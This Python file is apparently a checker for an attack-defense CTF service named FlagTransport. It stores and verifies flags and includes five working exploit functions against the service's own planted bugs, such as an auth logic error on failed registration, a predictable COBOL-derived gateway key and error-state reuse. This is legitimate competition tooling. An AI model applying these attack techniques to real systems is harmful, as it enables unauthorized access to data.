#!/usr/bin/env python3

# TODO: Feedback - enochecker-test doesn't have enochecker-core set as a dependency

# TODO: Feedback - Logs are awful (probably just my incompentence to run one test at time)
# TODO: Feedback - "Checker internal error" exceptions ("AttributeError: Variant_id 2 not defined for method putflag")
#                  They are very annnoying and they make looking for an actual errors/exceptions harder.
# TODO: Feedback - enochecker_logs "ignore" first Ctrl+C


# TODO: Feedback - Would be nice to be able to add classes/contructors directly (without wrapper) in `register_dependency`
# TODO: Feedback - Would be nice to support `Self` as a return annotation in `register_dependency`
# TODO: Feedback - `ChainDB.get()` is not annotated for allowed "storable" types
# TODO: Feedback - Would be nice to be able to store (atleast "simple") dataclasses in `ChainDB`
# TODO: Feedback - `from __future__ import annotations` breaks everything
# from __future__ import annotations

import asyncio
import contextlib
import inspect
import math
import random
import string
from dataclasses import astuple, dataclass, fields, is_dataclass
from logging import LoggerAdapter
from types import CoroutineType
from typing import Any, Callable, NoReturn, ParamSpec, Self, TypeVar, cast, overload

from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    BaseCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher

# Number of retries for registration of entities
REGISTER_RETRIES = 3
# Number of retries for gateway requests
GATEWAY_RETRIES = 3
# Amout of time to wait for gateway request before retrying
GATEWAY_RETRY_TIMEOUT = 0.5


T = TypeVar("T")
TCorutine = TypeVar("TCorutine", bound=CoroutineType)
P = ParamSpec("P")


def fail(msg: str, err_log_msg: str | None = None) -> NoReturn:
    raise MumbleException(msg, err_log_msg)


UNKNOWN_RESPONSE = "Unexpected/Mumbled response"


def fail_unexpected(unexpected: str | bytes) -> NoReturn:
    fail(UNKNOWN_RESPONSE, f"Got unexpected response: {unexpected!r}")


def check(cond: bool, msg: str, err_log_msg: str | None = None):
    """`cond` must be `True` to pass."""
    if not cond:
        if not err_log_msg:
            frame = inspect.currentframe()
            assert frame is not None and frame.f_back is not None
            frame_info = inspect.getframeinfo(frame.f_back)
            assert frame_info.code_context is not None
            err_log_msg = f"Check failed at {frame_info.filename}@{frame_info.lineno}: {frame_info.code_context[0].strip()}"
        fail(msg, err_log_msg)


def check_eq(actual, expected, msg: str):
    check(actual == expected, msg, f"Expected {expected!r} but got {actual!r}")


def check_in(actual, expected, msg: str):
    check(expected in actual, msg, f"{expected!r} is not in {actual!r}")


@contextlib.contextmanager
def fail_context(context: str):
    try:
        yield
    except MumbleException as e:
        assert e.message
        raise MumbleException(f"{context}: {e.message}", e.log_message)


def set_fail_context(context: str) -> Callable[[Callable[P, T]], Callable[P, T]]:
    def wrapper(f: Callable[P, T]) -> Callable[P, T]:
        def wrapped(*args: P.args, **kwargs: P.kwargs) -> T:
            with fail_context(context):
                return f(*args, **kwargs)

        return wrapped

    return wrapper


def randbool(chance: float = 0.5) -> bool:
    return random.random() < chance


def randstr(
    length: int | tuple[int, int],
    extra: str = "",
    chars: str = string.ascii_letters + string.digits,
) -> str:
    if isinstance(length, tuple):
        length = random.randint(*length)
    return "".join(random.choices(chars + extra, k=length))


def random_text(l: int) -> str:
    end_chars = ".,;?!"
    o = ""
    while l:
        l -= 1
        if not l and randbool():
            o += random.choice(end_chars)
            continue
        if o and randbool(1 / 8):
            if l and randbool(1 / 5):
                o += random.choice(end_chars)
                l -= 1
            o += " "
        else:
            is_word_start = not o or o[-1] in (end_chars + " ")
            if (is_word_start and randbool(1 / 20)) or (o and o[-1] in string.digits):
                c = random.choice(string.digits)
            else:
                c = random.choice(string.ascii_lowercase)
                if is_word_start:
                    c = c.upper()
            o += c
    return o


@dataclass
class Point:
    x: int
    y: int

    def __str__(self) -> str:
        return str((self.x, self.y))

    def __add__(self, other: "Point") -> "Point":
        return Point(self.x + other.x, self.y + other.y)

    def __sub__(self, other: "Point") -> "Point":
        return Point(self.x - other.x, self.y - other.y)

    def sqr_mag(self) -> int:
        return self.x**2 + self.y**2

    def mag(self) -> float:
        return math.sqrt(self.sqr_mag())

    def manhattan(self) -> int:
        return abs(self.x) + abs(self.y)

    def random_near_point(
        self, max_distance: int = 50, min_distance: int = 1
    ) -> "Point":
        while True:
            offset = Point(
                random.randint(-max_distance, max_distance),
                random.randint(-max_distance, max_distance),
            )
            if min_distance <= offset.manhattan() <= max_distance:
                return self + offset

    def random_point_towards(
        self, target: "Point", max_distance: int | None = None
    ) -> "Point":
        if max_distance is None:
            max_distance = (self - target).manhattan()
        else:
            max_distance = min((self - target).manhattan(), max_distance)

        original_mag = (self - target).sqr_mag()
        while True:
            next = self.random_near_point(max_distance)
            if (next - target).sqr_mag() < original_mag:
                return next


def random_warehouse_name() -> str:
    return randstr((20, 40))


def random_password() -> str:
    return randstr((30, 40))


def random_vehichle_number() -> int:
    return random.randint(1, 99999999999999)


def random_cargo_id() -> str:
    return randstr((10, 30))


def random_location() -> Point:
    return Point(random.randint(0, 9999999), random.randint(0, 9999999))


def make_random_path(
    start: Point, end: Point, max_step: int = 30, step_limit: int | None = None
) -> list[Point]:
    """Both `start` and `end` are included in path."""
    o: list[Point] = [start]
    while o[-1] != end and (step_limit is None or step_limit):
        if (o[-1] - end).manhattan() <= max_step / 3:
            o.append(end)
        else:
            o.append(o[-1].random_point_towards(end, max_step))
        if step_limit:
            step_limit -= 1
    return o


# TODO: Feedback - I would like to put my "test methods" onto the checker class itself (like Faust)
# so I have state which I don't need to pass around through arguments (TODO: but I actually need to
# try to use it like that)
checker = Enochecker("FlagTransport", 6256)
# TODO: Feedback - Whole checker is bunch of boilerplate
app = lambda: checker.app


class BaseConnectionClient:
    def __init__(self, host: str, log: LoggerAdapter, port: int = 6256):
        self.host: str = host
        self.port: int = port
        self.log: LoggerAdapter = log

    async def _open_conn(self):
        self.log.debug("Openning new TCP connection to '%s:%s'", self.host, self.port)
        try:
            self._reader, self._writer = await asyncio.streams.open_connection(
                self.host, self.port
            )
        except:
            import traceback

            trace = traceback.format_exc()
            self.log.info(f"Failed to connect to service\n{trace}")
            raise OfflineException("Could not establish socket connection to service")

    async def close(self):
        # We just ignore all exceptions about already closed / invalid stream
        try:
            await self._writer.drain()
        except:
            pass
        try:
            self._writer.close()
            # Why this is sepate method and not corutine returned from `.close()`?
            await self._writer.wait_closed()
        except:
            pass

    async def reconnect(self):
        await self.close()
        await self._open_conn()

    @classmethod
    async def from_checker_task(
        cls, task: BaseCheckerTaskMessage, log: LoggerAdapter
    ) -> Self:
        client = cls(task.address, log)
        await client._open_conn()
        return client

    async def recv_raw(self, n: int) -> bytes:
        # TODO: Handle small buffer asyncio error
        self.log.debug("Receiving %s bytes...", n)
        data = await self._reader.readexactly(n)
        self.log.debug("Received %s bytes: %r", len(data), data)
        return data

    async def recv_until(self, delim: str | bytes, drop: bool = True) -> str:
        if isinstance(delim, str):
            delim = delim.encode()
        self.log.debug("Receiving until %r...", delim)
        data = await self._reader.readuntil(delim)
        self.log.debug("Received %s bytes: %r", len(data), data)
        # It may seem "more correct" to put this assert into the `if` block
        # but this invariant should hold all the time so it makes sense to
        # always verify this.
        assert data.endswith(delim)
        if drop:
            data = data.removesuffix(delim)
        try:
            return data.decode()
        except:
            fail_unexpected(data)

    async def recv_line(self, expected: str | None = None) -> str:
        resp = await self.recv_until("\n")
        if expected is not None:
            check_eq(resp, expected, UNKNOWN_RESPONSE)
        return resp

    async def send_line(self, data: str | bytes):
        if isinstance(data, str):
            data = data.encode()
        data += b"\n"
        self.log.debug("Sending %s bytes: %r", len(data), data)
        # Note that this actually doesn't send the data but just put them
        # into "to be sent" buffer. See `.drain()` for more details.
        self._writer.write(data)


@dataclass
class Warehouse:
    name: str
    password: str
    location: Point

    def __post_init__(self):
        assert len(self.name) > 5


@dataclass
class Vehichle:
    number: int
    password: str
    location: Point


@dataclass
class Cargo:
    id: str
    destination: str
    note: str


class ControllerClient(BaseConnectionClient):
    async def _open_conn(self):
        await super()._open_conn()
        await self.recv_line("$>> FlagTransport")
        await self.recv_line("$>>       Controller")
        await self.recv_line("$>>             Console")

    @set_fail_context("REGISTER WAREHOUSE")
    async def register_warehouse(self, warehouse: Warehouse) -> bool:
        self.log.info(
            "Registering warehouse %r...",
            warehouse,
        )
        await self.send_line("REGISTER WAREHOUSE")
        await self.recv_line("?>> Warehouse name:")
        await self.send_line(warehouse.name)
        await self.recv_line("?>> Warehouse password:")
        await self.send_line(warehouse.password)
        await self.recv_line("?>> Location:")
        await self.send_line(f"{warehouse.location.x} {warehouse.location.y}")

        resp = await self.recv_line()
        if resp == "/>> Registration success":
            self.log.info("Registration success")
            return True
        if resp == "!>> Registration failed":
            self.log.warning("Registration failed (warehouse name %r)", warehouse.name)
            return False

        fail_unexpected(resp)

    @set_fail_context("MANAGE WAREHOUSE")
    async def manage_warehouse(self, name: str, password: str) -> bool:
        self.log.info("Try to manage warehouse %r using password %r...", name, password)
        assert len(name) > 5
        await self.send_line("MANAGE WAREHOUSE")
        await self.recv_line("?>> Warehouse name:")
        await self.send_line(name)
        await self.recv_line("?>> Warehouse password:")
        await self.send_line(password)

        resp = await self.recv_line()
        if resp == "/>> Authentication success":
            self.log.info("Authentication success")
            return True
        if resp == "!>> Authentication failed":
            self.log.warning("Authentication failed")
            return False

        fail_unexpected(resp)

    @set_fail_context("REGISTER CARGO")
    async def register_cargo(self, cargo: Cargo) -> bool:
        self.log.info("Registering cargo %r ...", cargo)
        await self.send_line("REGISTER CARGO")
        await self.recv_line("?>> Cargo ID:")
        await self.send_line(cargo.id)
        await self.recv_line("?>> Cargo destination:")
        await self.send_line(cargo.destination)
        await self.recv_line("?>> Cargo note:")
        await self.send_line(cargo.note)

        resp = await self.recv_line()
        if resp == "/>> Registration success":
            self.log.info("Registration success")
            return True
        if resp == "!>> Registration failed":
            self.log.warning("Registration failed (cargo ID %r)", cargo.id)
            return False

        fail_unexpected(resp)

    @set_fail_context("LIST CARGO")
    async def list_cargo(self) -> list[Cargo]:
        """Destination of returned cargo is always empty string."""
        self.log.info("Listing cargo in current warehouse...")
        await self.send_line("LIST CARGO")
        await self.recv_line("/>> Cargo list start")
        output: list[Cargo] = []
        while True:
            resp = await self.recv_line()
            if resp == "/>> Cargo list end":
                break
            if not resp.startswith("*>> Cargo ") or ": " not in resp:
                fail_unexpected(resp)
            resp = resp.removeprefix("*>> Cargo ")
            splited = resp.split(": ", 1)
            output.append(Cargo(splited[0], "", splited[1]))

        self.log.info("Retrieved %s cargo items", len(output))
        return output

    @set_fail_context("READ LOG")
    async def read_log(self) -> list[str]:
        self.log.info("Reading log for current warehouse...")
        await self.send_line("READ LOG")
        await self.recv_line("/>> Log start")
        output: list[str] = []
        while True:
            resp = await self.recv_line()
            if resp == "/>> Log end":
                break
            output.append(resp)
        self.log.info("Retrieved %s log entries", len(output))
        return output

    @set_fail_context("REGISTER VEHICHLE")
    async def register_vehichle(self, vehichle: Vehichle) -> bool:
        self.log.info(
            "Registering vehichle %r...",
            vehichle,
        )
        await self.send_line("REGISTER VEHICHLE")
        await self.recv_line("?>> Vehichle number:")
        await self.send_line(f"{vehichle.number}")
        await self.recv_line("?>> Vehichle password:")
        await self.send_line(vehichle.password)
        await self.recv_line("?>> Location:")
        await self.send_line(f"{vehichle.location.x} {vehichle.location.y}")

        resp = await self.recv_line()
        if resp == "/>> Registration success":
            self.log.info("Registration success")
            return True
        if resp == "!>> Registration failed":
            self.log.warning(
                "Registration failed (vehichle number %r)", vehichle.number
            )
            return False

        fail_unexpected(resp)

    @set_fail_context("MANAGE VEHICHLE")
    async def manage_vehichle(self, number: int, password: str) -> bool:
        self.log.info(
            "Try to manage vehichle %r using password %r...", number, password
        )
        await self.send_line("MANAGE VEHICHLE")
        await self.recv_line("?>> Vehichle number:")
        await self.send_line(str(number))
        await self.recv_line("?>> Vehichle password:")
        await self.send_line(password)

        resp = await self.recv_line()
        if resp == "/>> Authentication success":
            self.log.info("Authentication success")
            return True
        if resp == "!>> Authentication failed":
            self.log.warning("Authentication failed")
            return False

        fail_unexpected(resp)

    @set_fail_context("GATEWAY KEY")
    async def get_gateway_key(self) -> str:
        self.log.info("Gettting gateway key for current vehichle...")
        await self.send_line("GATEWAY KEY")
        resp = await self.recv_line()
        if not resp.startswith("/>> Key: "):
            fail_unexpected(resp)
        key = resp.removeprefix("/>> Key: ")
        self.log.info("Obtained key %r", key)
        # TODO: Check key format?
        return key

    @set_fail_context("LOAD CARGO")
    async def load_cargo(self, id: str):
        self.log.info("Loading cargo %r...", id)
        await self.send_line("LOAD CARGO")
        await self.recv_line("?>> Cargo ID:")
        await self.send_line(id)
        await self.recv_line("/>> Cargo loaded to the vehichle")
        self.log.info("Cargo loaded")

    @set_fail_context("UNLOAD CARGO")
    async def unload_cargo(self, id: str):
        self.log.info("Unloading cargo %r...", id)
        await self.send_line("UNLOAD CARGO")
        await self.recv_line("?>> Cargo ID:")
        await self.send_line(id)
        await self.recv_line("/>> Cargo unloaded from vehichle")
        self.log.info("Cargo unloaded")

    @set_fail_context("EXIT")
    async def exit(self):
        self.log.info("Exiting...")
        await self.send_line("EXIT")
        await self.recv_line("/>> Console closed")
        await self.close()

    async def register_random_warehouse(
        self,
        *,
        location: Point | None = None,
        near: Point | None = None,
        retries: int = REGISTER_RETRIES,
    ) -> Warehouse:
        for _ in range(retries):
            warehouse = Warehouse(
                random_warehouse_name(),
                random_password(),
                (
                    (random_location() if near is None else near.random_near_point())
                    if location is None
                    else location
                ),
            )
            if await self.register_warehouse(warehouse):
                return warehouse
        fail(f"Failed to register a warehouse on {retries} tries")

    async def register_random_vehichle(
        self,
        *,
        location: Point | None = None,
        near: Point | None = None,
        retries: int = REGISTER_RETRIES,
    ) -> Vehichle:
        for _ in range(retries):
            vehichle = Vehichle(
                random_vehichle_number(),
                random_password(),
                (
                    (random_location() if near is None else near.random_near_point())
                    if location is None
                    else location
                ),
            )
            if await self.register_vehichle(vehichle):
                return vehichle
        fail(f"Failed to register a vehichle on {retries} tries")

    async def register_random_cargo(
        self,
        *,
        destination: str | None = None,
        note: str | None = None,
        retries: int = REGISTER_RETRIES,
    ) -> Cargo:
        for _ in range(retries):
            cargo = Cargo(
                random_cargo_id(),
                destination or random_warehouse_name(),
                note
                or (
                    random_text(random.randint(10, 50)).strip()
                    if randbool()
                    else randstr(random.randint(10, 50))
                ),
            )
            if await self.register_cargo(cargo):
                return cargo
        fail(f"Failed to register a cargo on {retries} tries")


class GatewayClient(BaseConnectionClient):
    class StreamReaderProtocolUDP(asyncio.streams.StreamReaderProtocol):
        # This is copy-pasted `asyncio.streams.StreamReaderProtocol.data_received()`
        def datagram_received(self, data, addr):
            reader = self._stream_reader  # type: ignore
            if reader is not None:
                reader.feed_data(data)

    async def _open_conn(self):
        self.log.debug("Openning new UDP connection to '%s:%s'", self.host, self.port)
        # This is basically copy-paste from `asyncio.streams.open_connection()`
        loop = asyncio.get_running_loop()
        self._reader = asyncio.streams.StreamReader(limit=2**16, loop=loop)
        self._protocol = GatewayClient.StreamReaderProtocolUDP(self._reader, loop=loop)
        self._transport, _ = await loop.create_datagram_endpoint(
            lambda: self._protocol, remote_addr=(self.host, self.port)
        )
        self.needs_new_connection: bool = False

    async def close(self):
        try:
            await self._protocol._drain_helper()  # type: ignore
        except:
            pass
        try:
            self._transport.close()
        except:
            pass

    async def send_line(self, data: str | bytes):
        if isinstance(data, str):
            data = data.encode()
        data += b"\n"
        self.log.debug("Sending %s bytes: %r", len(data), data)
        # Note that this actually doesn't send the data but just put them
        # into "to be sent" buffer. See `.drain()` for more details.
        self._transport.sendto(data)

    @set_fail_context("Gateway location update")
    async def location_update(
        self,
        vehichle_number: int,
        gateway_key: str,
        location: Point,
        *,
        keep_connection_after: bool = False,
        timeout: float = GATEWAY_RETRY_TIMEOUT,
        retries: int = GATEWAY_RETRIES,
    ):
        async def func():
            self.log.info(
                "Updating location for vehichle %s to %s...", vehichle_number, location
            )
            if self.needs_new_connection:
                await self.reconnect()

            request = f"{vehichle_number}:{gateway_key}:L:{location.x}:{location.y}"
            await self.send_line(request)
            await self.recv_line(":OK:")
            await self.recv_line(":END:")

            self.log.info("Location updated")

            if not keep_connection_after:
                await self.close()
                self.needs_new_connection = True

        for x in range(retries):
            try:
                return await asyncio.wait_for(func(), timeout)
            except asyncio.TimeoutError:
                self.log.warning("Request timeouted %r/%r", x, retries)
                if x == retries - 1:
                    raise
                await self.reconnect()

        assert False

    @set_fail_context("Gateway status check")
    async def get_status(
        self,
        vehichle_number: int,
        gateway_key: str,
        *,
        keep_connection_after: bool = False,
        timeout: float = GATEWAY_RETRY_TIMEOUT,
        retries: int = GATEWAY_RETRIES,
    ) -> tuple[Point, list[Cargo]]:
        self.log.info("Getting status of vehichle %s...", vehichle_number)
        if self.needs_new_connection:
            await self.reconnect()

        request = f"{vehichle_number}:{gateway_key}:S"

        async def func():
            await self.send_line(request)

            resp = await self.recv_line()
            if not resp.startswith(":LOC:") or not resp.endswith(":"):
                fail_unexpected(resp)

            resp = resp.removeprefix(":LOC:").removesuffix(":")
            try:
                location = Point(*map(int, resp.split(":")))
            except:
                fail_unexpected(resp)

            self.log.info("Vehichle is at %s", location)

            cargo_list: list[Cargo] = []
            while True:
                resp = await self.recv_line()
                if resp == ":OK:":
                    break
                if not resp.startswith(":CAR:") or not resp.endswith(":"):
                    fail_unexpected(resp)
                resp = resp.removeprefix(":CAR:").removesuffix(":")
                splited = tuple(resp.split(":"))
                if len(splited) != 3:
                    fail_unexpected(resp)
                cargo_list.append(Cargo(*splited))

            self.log.info("Vehichle has %s cargo items", len(cargo_list))

            await self.recv_line(":END:")

            if not keep_connection_after:
                await self.close()
                self.needs_new_connection = True

            return (location, cargo_list)

        for x in range(retries):
            try:
                return await asyncio.wait_for(func(), timeout)
            except asyncio.TimeoutError:
                self.log.warning("Request timeouted %r/%r", x, retries)
                if x == retries - 1:
                    raise
                await self.reconnect()

        assert False


@checker.register_dependency
async def create_controller_client(
    task: BaseCheckerTaskMessage, log: LoggerAdapter
) -> ControllerClient:
    return await ControllerClient.from_checker_task(task, log)


del create_controller_client


@checker.register_dependency
async def create_gateway_client(
    task: BaseCheckerTaskMessage, log: LoggerAdapter
) -> GatewayClient:
    return await GatewayClient.from_checker_task(task, log)


del create_gateway_client


def fromtuple(values: tuple, datacls: type[T]) -> T:
    return datacls(
        *(
            fromtuple(value, field.type) if is_dataclass(field.type) else value  # type: ignore
            for value, field in zip(values, fields(datacls))  # type: ignore
        )
    )


class DataclassChainDB(ChainDB):
    @overload
    async def get(self, key: str, datacls: type[T]) -> T: ...

    @overload
    async def get(self, key: str) -> Any: ...

    async def get(self, key: str, datacls: type | None = None) -> Any:
        if datacls is None:
            return await super().get(key)
        else:
            return fromtuple(await super().get(key), datacls)

    async def set(self, key: str, val: Any):
        if is_dataclass(val):
            assert not isinstance(val, type)
            val = astuple(val)
        return await super().set(key, val)


# This is bit cursed because IDK how to get `._chain_collection` in "correct way"...
@checker.register_dependency
async def create_dataclass_chain_db(chain_db: ChainDB) -> DataclassChainDB:
    chain_db.__class__ = DataclassChainDB
    return chain_db  # type: ignore


del create_dataclass_chain_db

### Helper check functions ###


def check_expected_cargo_list(
    cargo_list: list[Cargo],
    expected: list[Cargo],
    *,
    check_destination: bool = True,
    check_note: bool = True,
):
    if len(cargo_list) < len(expected):
        fail(
            "Cargo items are missing from cargo list",
            f"Expected {len(expected)} cargo items but got {len(cargo_list)}",
        )
    if len(cargo_list) > len(expected):
        fail(
            "Cargo list has extra items",
            f"Expected {len(expected)} cargo items but got {len(cargo_list)}",
        )

    expected = sorted(expected, key=lambda x: x.id)
    cargo_list = sorted(cargo_list, key=lambda x: x.id)

    for a, b in zip(cargo_list, expected):
        check_eq(a.id, b.id, "Cargo ID changed")
        if check_destination:
            check_eq(a.destination, b.destination, "Cargo destination changed")
        if check_note:
            check_eq(a.note, b.note, "Cargo note changed")


### FLAGSTORE 0 - Flag cargo in warehouse ###


# TODO: Feedback - decorators not annotated for return value altough it is expected for fucntions to return a str
@checker.putflag(0)
async def putflag_warehouse(
    task: PutflagCheckerTaskMessage, state: DataclassChainDB, log: LoggerAdapter
) -> str:
    gateway = await GatewayClient.from_checker_task(task, log)
    controller0 = await ControllerClient.from_checker_task(task, log)
    warehouse0 = await controller0.register_random_warehouse()
    controller1 = await ControllerClient.from_checker_task(task, log)

    warehouse1 = await controller1.register_random_warehouse(near=warehouse0.location)
    vehichle = await controller0.register_random_vehichle(location=warehouse0.location)
    cargo = await controller0.register_random_cargo(
        destination=warehouse1.name, note=task.flag
    )
    await controller0.load_cargo(cargo.id)

    await controller1.manage_vehichle(vehichle.number, vehichle.password)
    gateway_key = await controller1.get_gateway_key()
    for location in make_random_path(warehouse0.location, warehouse1.location)[1:]:
        await gateway.location_update(vehichle.number, gateway_key, location)

    await controller1.unload_cargo(cargo.id)

    await state.set("warehouse_login", (warehouse1.name, warehouse1.password))
    return f"Flag cargo arrived to warehouse {warehouse1.name!r}"


# TODO: Feedback - It would be nice to be able to do multiple `@getflag()` for one flagstore
@checker.getflag(0)
async def getflag_warehouse(
    task: GetflagCheckerTaskMessage, state: DataclassChainDB, log: LoggerAdapter
):
    try:
        warehouse_login = await state.get("warehouse_login")
    except KeyError:
        raise MumbleException("Flag was not placed in previous tick") from None

    async def check_cargo_list():
        controller = await ControllerClient.from_checker_task(task, log)
        await controller.manage_warehouse(*warehouse_login)
        for cargo in await controller.list_cargo():
            if task.flag in cargo.note:
                return
        fail("Flag was not found in cargo list")

    async def check_log():
        controller = await ControllerClient.from_checker_task(task, log)
        await controller.manage_warehouse(*warehouse_login)
        for log_entry in await controller.read_log():
            if task.flag in log_entry:
                return
        fail("Flag was not found in warehouse log")

    checks = [check_cargo_list, check_log]
    random.shuffle(checks)
    for check in checks:
        await check()


# TODO: Feedback - why *I* need to manually increment these numbers when they don't really mean anything?
@checker.exploit(0)
async def exploit_failed_registration(
    task: ExploitCheckerTaskMessage,
    controller: ControllerClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    target_warehouse_name = task.attack_info.removeprefix(
        "Flag cargo arrived to warehouse '"
    ).removesuffix("'")
    if target_warehouse_name == task.attack_info:
        raise MumbleException("Wrong attack info") from None

    # We try to register as (already existing) target warehouse name...
    await controller.register_warehouse(
        Warehouse(target_warehouse_name, random_password(), Point(0, 0))
    )
    # ... this fails but we are now authenticated to it due to a logic error.

    for cargo in await controller.list_cargo():
        if flag := flag_seacher.search_flag(cargo.note):
            return flag

    fail(f"Exploit failed for {target_warehouse_name!r}")


@checker.exploit(1)
async def exploit_log_path_length(
    task: ExploitCheckerTaskMessage,
    controller: ControllerClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    target_warehouse_name = task.attack_info.removeprefix(
        "Flag cargo arrived to warehouse '"
    ).removesuffix("'")
    if target_warehouse_name == task.attack_info:
        raise MumbleException("Wrong attack info") from None

    # We register warehouse that has last 5 chars different...
    await controller.register_warehouse(
        Warehouse(
            target_warehouse_name[:-5] + randstr(5), random_password(), Point(0, 0)
        )
    )
    # ... this makes us able to see logs of target warehouse.

    for x in await controller.read_log():
        if flag := flag_seacher.search_flag(x):
            return flag

    fail(f"Exploit failed for {target_warehouse_name!r}")


### FLAGSTORE 1 - Flag cargo in vehichle ###


@checker.putflag(1)
async def putflag_vehichle(
    task: PutflagCheckerTaskMessage, log: LoggerAdapter, state: DataclassChainDB
) -> str:
    # Register warehouse and dispatch vehichle
    controller = await ControllerClient.from_checker_task(task, log)
    if randbool():
        vehichle = await controller.register_random_vehichle()
        warehouse = await controller.register_random_warehouse(near=vehichle.location)
    else:
        warehouse = await controller.register_random_warehouse()
        vehichle = await controller.register_random_vehichle(near=warehouse.location)

    # Move vehichle to warehouse location
    gateway = await GatewayClient.from_checker_task(task, log)
    gateway_key = await controller.get_gateway_key()
    await gateway.location_update(vehichle.number, gateway_key, warehouse.location)

    # Create and load flag cargo
    target_warehouse = (
        await (
            await ControllerClient.from_checker_task(task, log)
        ).register_random_warehouse()
    ).name
    cargo = await controller.register_random_cargo(
        destination=target_warehouse, note=task.flag
    )
    await controller.load_cargo(cargo.id)

    # Move vehichle a bit
    vehichle.location = warehouse.location.random_near_point()
    await gateway.location_update(vehichle.number, gateway_key, vehichle.location)

    # Save state
    await state.set("vehichle", vehichle)
    await state.set("gateway_key", gateway_key)
    await state.set("cargo", cargo)
    return f"Flag cargo is being transported by vehichle #{vehichle.number!r}"


@checker.getflag(1)
async def getflag_vehichle(
    task: GetflagCheckerTaskMessage, log: LoggerAdapter, state: DataclassChainDB
):
    try:
        vehichle = await state.get("vehichle", Vehichle)
        gateway_key = await state.get("gateway_key")
        cargo = await state.get("cargo", Cargo)
    except KeyError:
        raise MumbleException("Flag was not placed in previous tick") from None

    gateway = await GatewayClient.from_checker_task(task, log)

    async def new_gateway_key():
        # Sometimes we use different gateway key...
        controller = await ControllerClient.from_checker_task(task, log)
        await controller.manage_vehichle(vehichle.number, vehichle.password)
        gateway_key = await controller.get_gateway_key()
        if randbool():
            await controller.close()
        # ... and sometimes we keep using it in the future...
        if randbool():
            await state.set("gateway_key", gateway_key)

    async def authenticated_status():
        current_location, cargo_list = await gateway.get_status(
            vehichle.number, gateway_key
        )

        check_eq(current_location, vehichle.location, "Vehichle location changed")
        # We need to replace note from loaded cargo to pass "wrong flag test"
        cargo.note = task.flag
        check_expected_cargo_list(cargo_list, [cargo])

    async def anonymous_status():
        current_location, cargo_list = await gateway.get_status(vehichle.number, "")
        check_eq(current_location, vehichle.location, "Vehichle location changed")
        check_expected_cargo_list(cargo_list, [cargo], check_note=False)

    ops: list[Callable[[], CoroutineType]] = [anonymous_status, authenticated_status]
    random.shuffle(ops)
    if randbool():
        ops.insert(random.randint(0, ops.index(authenticated_status)), new_gateway_key)
    log.debug("Order of checks: %s", ", ".join(x.__name__ for x in ops))
    for op in ops:
        await op()


@checker.exploit(2)
async def exploit_gateway_error_handling(
    task: ExploitCheckerTaskMessage,
    log: LoggerAdapter,
    gateway: GatewayClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    try:
        target_vehichle = int(
            task.attack_info.removeprefix(
                "Flag cargo is being transported by vehichle #"
            )
        )
    except ValueError:
        raise MumbleException("Wrong attack info") from None

    controller = await ControllerClient.from_checker_task(task, log)

    for _ in range(3):
        vehichle = await controller.register_random_vehichle()
        key = await controller.get_gateway_key()

        # We need to try such vehichle number to which we can add our
        # vehichle number and get target vehichle number.
        # `VEHICHLE_NUMBER_MOD` is there just in case we underflow/overflow
        # but if this mod is wrong (e.g. team changed the max number size),
        # then we can try again and get vehichle number which won't cause
        # and these issues.
        VEHICHLE_NUMBER_MOD = 1000000000000000
        exploitable_number = (vehichle.number - target_vehichle) % VEHICHLE_NUMBER_MOD

        if await controller.register_vehichle(
            Vehichle(exploitable_number, random_password(), random_location())
        ):
            break
    else:
        fail("Failed to register a vehichle")

    # We need to do a operation with "exploitable" vehichle that causes an error.
    # Connection is kept open upon an error but internal state is not reset and
    # we take advantage of it.
    await gateway.send_line(f"{exploitable_number}:x:S")
    await gateway.recv_until(":ERR:\n")
    await gateway.send_line(f"{target_vehichle}:{key}:S")

    if flag := flag_seacher.search_flag(await gateway.recv_until(":END:\n")):
        return flag

    fail(f"Exploit failed for {target_vehichle!r}")


@checker.exploit(3)
async def exploit_predicatable_gateway_key(
    task: ExploitCheckerTaskMessage,
    gateway: GatewayClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    try:
        target_vehichle = int(
            task.attack_info.removeprefix(
                "Flag cargo is being transported by vehichle #"
            )
        )
    except ValueError:
        raise MumbleException("Wrong attack info") from None

    # Code for gateway key generation:
    #   PERFORM VARYING Gateway-Key-Index FROM 1 BY 1
    #       UNTIL Gateway-Key-Index > 50
    #       COMPUTE Gateway-Key-Temp =
    #           26 * FUNCTION ORD(VE-Password(Gateway-Key-Index:1))
    #           + Gateway-Key-Index * VE-Number
    #           + VE-Number / Gateway-Key-Index
    #       MOVE FUNCTION CHAR(
    #           66 + FUNCTION MOD(Gateway-Key-Temp, 26)
    #       ) TO Gateway-Key(Gateway-Key-Index:1)

    # Password can be basically ommited (due to modulation)
    # and so we can compute the key for ourself:
    key = ""
    for i in range(1, 50 + 1):
        # Default rounding mode in COBOL in "truncation".
        # "chr(n)" in COBOL means "n-th" char in ASCII so we need to do `- 1`.
        key += chr(
            66 + ((i * target_vehichle + math.trunc(target_vehichle / i)) % 26) - 1
        )

    for x in (await gateway.get_status(target_vehichle, key))[1]:
        if flag := flag_seacher.search_flag(x.note):
            return flag

    fail(f"Exploit failed for {target_vehichle!r}")


@checker.exploit(4)
async def exploit_missing_vehichle_check(
    task: ExploitCheckerTaskMessage,
    controller: ControllerClient,
    gateway: GatewayClient,
    flag_seacher: FlagSearcher,
) -> bytes:
    assert task.attack_info
    try:
        target_vehichle = int(
            task.attack_info.removeprefix(
                "Flag cargo is being transported by vehichle #"
            )
        )
    except ValueError:
        raise MumbleException("Wrong attack info") from None

    location = random_location()
    _, cargo_list = await gateway.get_status(target_vehichle, "")
    await controller.register_random_vehichle(location=location)
    await controller.register_random_warehouse(location=location)
    await controller.unload_cargo(cargo_list[0].id)

    for x in await controller.read_log():
        if flag := flag_seacher.search_flag(x):
            return flag

    fail(f"Exploit failed for {target_vehichle!r}")


### SLA checks ###


@checker.putnoise(0)
async def putnoise_warehouse_cargo(
    state: DataclassChainDB, controller: ControllerClient
):
    await state.set("warehouse", await controller.register_random_warehouse())
    cargo_count = random.randint(2, 4)
    for x in range(cargo_count):
        await state.set(f"cargo{x}", await controller.register_random_cargo())
